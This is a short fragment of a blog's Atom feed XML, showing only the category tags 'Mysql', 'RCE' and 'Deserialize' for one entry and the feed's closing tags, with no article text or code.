      <category term="Mysql" scheme="https://blog.sari3l.com/tags/Mysql/"/>
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
</feed>
